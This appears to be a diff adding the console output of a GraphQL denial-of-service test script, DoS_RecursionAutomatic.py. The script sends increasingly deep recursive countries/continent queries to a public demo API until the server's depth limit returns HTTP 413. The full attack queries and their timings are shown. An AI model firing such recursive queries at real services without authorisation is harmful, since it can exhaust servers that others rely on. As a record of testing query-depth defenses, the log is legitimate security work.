@@ -1,0 +1,32 @@
+> python .\DoS_RecursionAutomatic.py -u https://countries.trevorblades.com/ -c countries continent --root continent --root-args 'code: \"AF\"'
+
+
+Testing recursion: countries -> continent
+Wrapped in root field: continent(code: "AF")
+Depths 2-20 (step 2) with timeout=10.0s and threshold=5.0s
+
+
+------------------------------------------------------------
+
+
+
+The following query was build:query recursiveTest { continent(code: "AF") { countries { continent { __typename } } } }
+[OK]   Depth 2 completed in 0.45s (HTTP 200)
+
+The following query was build:query recursiveTest { continent(code: "AF") { countries { continent { countries { continent { __typename } } } } } }
+[OK]   Depth 4 completed in 0.32s (HTTP 200)
+
+The following query was build:query recursiveTest { continent(code: "AF") { countries { continent { countries { continent { countries { continent { __typename } } } } } } } }
+[OK]   Depth 6 completed in 0.30s (HTTP 200)
+
+The following query was build:query recursiveTest { continent(code: "AF") { countries { continent { countries { continent { countries { continent { countries { continent { __typename } } } } } } } } } }
+[FAIL] Depth 8 HTTP 413 in 0.15s
+{"errors":[{"message":"Query depth limit exceeded.","extensions":{"code":"GCDN_QUERY_DEPTH_LIMIT","httpStatusCode":413}}]}
+
+Stopping at depth 8 (elapsed 0.15s)
+
+Summary:
+Depth   2: OK in 0.45s (HTTP 200)
+Depth   4: OK in 0.32s (HTTP 200)
+Depth   6: OK in 0.30s (HTTP 200)
+Depth   8: FAIL in 0.15s (HTTP 413)
